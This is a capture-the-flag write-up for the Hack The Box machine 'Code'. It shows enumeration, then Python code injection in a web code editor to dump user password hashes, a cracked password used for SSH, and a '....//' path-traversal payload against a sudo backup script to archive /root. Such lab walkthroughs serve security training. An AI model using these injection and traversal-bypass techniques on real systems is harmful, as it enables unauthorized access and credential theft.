---
clayout: ctf
title: Code
date: 2025-05-14
image: /ctf/hack-the-box/machines/code/info-card.png
type: Hack The Box
ctf:
    - name: Code
      link: https://app.hackthebox.com/machines/653
      thumbnail: /ctf/hack-the-box/machines/code/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/653
          thumbnail: /ctf/hack-the-box/machines/code/pwned.png
---

# Enumeration

## Network Scanning

We perform a scan to identify open ports and services:

```bash
nmap -sC -sV -v -A -p- -oN nmap.txt 10.10.11.62
```

**Scan Results:**

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b5b97cc4503295bcc26517df51a27abd (RSA)
|   256 94b525549b68afbe40e11da86b850d01 (ECDSA)
|_  256 128cdc97ad8600b488e229cf69b56596 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: gunicorn/20.0.4
```

**Summary of Open Ports:**

| Port     | Service | Version         |
| -------- | ------- | --------------- |
| 22/tcp   | SSH     | OpenSSH 8.2p1   |
| 5000/tcp | HTTP    | Gunicorn 20.0.4 |

## Web Enumeration

Navigating to `http://10.10.11.62:5000` revealed a custom Python code editor interface.

![Python Code Editor](/ctf/hack-the-box/machines/code/python-code-editor.png)

Using `Wappalyzer`, we identified the following client-side technology:

* **Ace Editor**: Version 1.4.12

![Wappalyzer Output](/ctf/hack-the-box/machines/code/wappalyzer.png)

### Code Injection for Environment Enumeration

Through the code execution interface, we executed the following payload to inspect the global environment:

```python
raise Exception(globals())
```

This revealed the presence of a `User` class:

```python
'User': <class 'app.User'>,
```

We used SQLAlchemy-style enumeration to extract user credentials from the database:

```python
for user in User.query.all():
    print(user.username, user.password)
```

**Extracted Credentials:**

```
development 759b74ce43947f5f4c91aeddc3e5bad3
martin      3de6f30c4a09c27fc71932bfc68474be
```

Cracking the hash for `martin` using CrackStation:

```
martin: nafeelswordsmaster
```

### SSH Access

Using the recovered credentials, we established an SSH session:

```bash
ssh martin@10.10.11.62
```

Access was successfully obtained as the user `martin`.

# Privilege Escalation

## Sudo Rights Enumeration

We identified a `sudo` rule allowing passwordless execution of a backup script:

```bash
sudo -l
```

```bash
User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

### Analysis of `/usr/bin/backy.sh`

```bash
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

Key behaviors:

* Accepts a JSON file containing backup parameters.
* Enforces path sanitization to prevent directory traversal using `gsub("\\.\\./"; "")`.
* Restricts backups to directories under `/var/` and `/home/`.

**JSON Validation Example:**

```json
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/home/app-production/app"
  ],
  "exclude": [".*"]
}
```

## Exploiting Path Traversal

Despite sanitization, the script improperly handles crafted path traversal sequences such as `....//`, which bypasses the filter.

**Malicious JSON Payload:**

```json
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/var/....//root/",
    "/home/app-production"
  ],
  "exclude": []
}
```

![Path Traversal Execution](/ctf/hack-the-box/machines/code/path-traversal.png)

After executing the script with the payload:

```bash
sudo /usr/bin/backy.sh /home/martin/backups/task.json
```

Backup archives were generated:

```bash
tar -jxvf code_home_app-production_2025_May.tar.bz2
tar -jxvf code_var_.._root_2025_May.tar.bz2
```

**Recovered Flags:**

* **User Flag**: Located in `/home/martin/backups/home/app-production`
* **Root Flag**: Located in `/home/martin/backups/root`
